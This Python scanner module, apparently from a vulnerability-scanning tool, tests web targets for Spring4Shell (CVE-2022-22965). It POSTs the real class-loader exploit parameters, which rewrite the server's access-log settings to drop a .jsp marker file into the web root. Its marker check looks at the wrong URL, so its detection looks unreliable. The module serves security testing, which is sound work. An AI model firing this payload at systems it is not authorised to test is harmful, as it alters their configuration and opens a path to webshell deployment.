from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("spring4shell")


@register_scanner
class Spring4ShellScanner(BaseScanner):
    name = "Spring4Shell (CVE-2022-22965)"
    description = "Spring Framework RCE via data binding, JDK 9+"
    category = "spring"
    module = "spring4shell"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-22965"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
        "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement",
    ]
    fix_suggestion = "升级Spring Framework至5.3.18+或5.2.20+，或升级Spring Boot至2.6.6+或2.5.12+"

    def check(self) -> bool:
        test_param = "class.module.classLoader.resources.context.parent.pipeline.first.pattern"
        test_marker = "wyqy_spring4shell_test"
        test_value = f"%{{prefix}}{test_marker}%{{suffix}}"

        suffixes = [
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix=wyqy",
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        ]

        found = False
        for path in ["/", "/index.html", "/actuator"]:
            url = f"{self.target}{path}"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "suffix": "%>//",
                "c1": "Runtime",
                "c2": "<%",
                "DNT": "1",
            }
            payload_data = f"{test_param}={test_value}"
            for sfx in suffixes:
                payload_data += f"&{sfx}"

            resp = http_request("POST", url, data=payload_data, headers=headers)
            if resp is None:
                continue

            check_resp = http_request("GET", url)
            if check_resp and test_marker in check_resp.text:
                self.add_result(
                    target_url=url,
                    detail="Spring4Shell RCE漏洞确认，攻击者可写入WebShell",
                    payload=payload_data,
                    request_data=f"POST {url}",
                    response_snippet=check_resp.text[:500],
                    evidence=f"检测到特征标记: {test_marker}",
                )
                found = True
                break

        if not found:
            version_check_paths = ["/", "/actuator/info"]
            for path in version_check_paths:
                url = f"{self.target}{path}"
                resp = http_request("GET", url)
                if resp and "X-Powered-By" in resp.headers:
                    powered_by = resp.headers.get("X-Powered-By", "")
                    if "Spring" in powered_by:
                        self.add_result(
                            target_url=url,
                            name="Spring Framework Version Detected",
                            risk_level="info",
                            risk_score=0,
                            description="检测到Spring Framework，请手动确认版本",
                            detail=f"X-Powered-By: {powered_by}",
                            evidence=f"Header: X-Powered-By: {powered_by}",
                        )
                        break

        return found
